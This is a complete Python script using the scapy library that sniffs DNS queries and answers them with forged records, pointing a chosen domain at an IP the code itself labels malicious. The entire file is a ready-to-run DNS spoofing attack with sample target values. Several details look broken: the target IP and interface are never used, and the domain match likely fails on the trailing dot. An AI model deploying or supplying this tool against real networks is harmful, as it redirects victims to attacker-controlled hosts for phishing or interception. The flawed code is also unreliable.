from scapy.all import Ether, IP, UDP, DNS, DNSRR, sendp, sniff, RandMAC
import logging

def dns_spoof(target_ip, spoof_ip, domain):
    """
    Listen for DNS requests and respond with a spoofed IP.
    :param target_ip: The IP address of the target to spoof
    :param spoof_ip: The IP address to respond with (malicious)
    :param domain: The domain to spoof
    """
    def handle_dns_request(pkt):
        if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # Check if it's a DNS query
            if pkt[DNS].qd.qname.decode() == domain:
                # Create a DNS response
                dns_response = Ether(dst=pkt[Ether].src, src=RandMAC()) / \
                               IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                               UDP(dport=pkt[UDP].sport, sport=53) / \
                               DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd,
                                   an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=spoof_ip, ttl=10))
                sendp(dns_response, verbose=False)
                logging.info("Spoofed DNS response sent for %s to %s", domain, spoof_ip)

    # Start sniffing for DNS requests
    logging.info("Starting DNS spoofing for domain: %s", domain)
    sniff(filter="udp and port 53", prn=handle_dns_request, store=0)

def check_if_root():
    """Check if the script is run as root."""
    if os.geteuid() != 0:
        logging.error("This script requires root privileges.")
        sys.exit(1)

def setup_logging():
    """Set up logging configuration."""
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Usage example
if __name__ == "__main__":
    import os
    import sys
    check_if_root()
    setup_logging()
    interface = "eth0"  # Change to your network interface
    target_ip = "192.168.1.10"  # Target IP address
    spoof_ip = "192.168.1.100"  # Malicious IP to respond with
    domain = "example.com"  # Domain to spoof

    dns_spoof(target_ip, spoof_ip, domain)
